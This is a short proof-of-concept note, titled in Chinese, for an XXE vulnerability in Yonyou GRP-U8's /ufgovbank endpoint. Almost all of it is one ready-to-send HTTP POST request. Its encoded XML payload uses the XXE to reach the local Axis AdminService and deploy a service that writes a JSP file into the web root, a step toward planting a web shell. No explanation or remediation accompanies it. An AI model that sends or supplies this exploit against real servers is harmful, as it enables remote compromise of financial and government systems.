## 用友GRP-U8-ufgovbank存在XXE漏洞

## poc
```
POST /ufgovbank HTTP/1.1
Host: 172.16.135.21:8009
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Content-Length: 1158

reqData=%3C%3Fxml%20version%3D%221.0%22%3F%3E%0A%3C%21DOCTYPE%20foo%20SYSTEM%20%22http%3A%2F%2F127.0.0.1%3A8009%2Fservices%2FAdminService%3Fmethod%3D%21--%253E%253Cdeployment%2520xmlns%253D%2522http%253A%252F%252Fxml.apache.org%252Faxis%252Fwsdd%252F%2522%2520xmlns%253Ajava%253D%2522http%253A%252F%252Fxml.apache.org%252Faxis%252Fwsdd%252Fproviders%252Fjava%2522%253E%253Cservice%2520name%253D%2522OpenTaske%2522%2520provider%253D%2522java%253ARPC%2522%253E%253CrequestFlow%253E%253Chandler%2520type%253D%2522java%253Aorg.apache.axis.handlers.LogHandler%2522%2520%253E%253Cparameter%2520name%253D%2522LogHandler.fileName%2522%2520value%253D%2522C:\UFGOV\U8\webapps\bx_cxjk_list.jsp%2522%2520%252F%253E%253Cparameter%2520name%253D%2522LogHandler.writeToConsole%2522%2520value%253D%2522false%2522%2520%252F%253E%253C%252Fhandler%253E%253C%252FrequestFlow%253E%253Cparameter%2520name%253D%2522className%2522%2520value%253D%2522java.util.Random%2522%2520%252F%253E%253Cparameter%2520name%253D%2522allowedMethods%2522%2520value%253D%2522*%2522%2520%252F%253E%253C%252Fservice%253E%253C%252Fdeployment%22%3E&signData=1&userIP=1&srcFlag=1&QYJM=0&QYNC=adaptertest
```
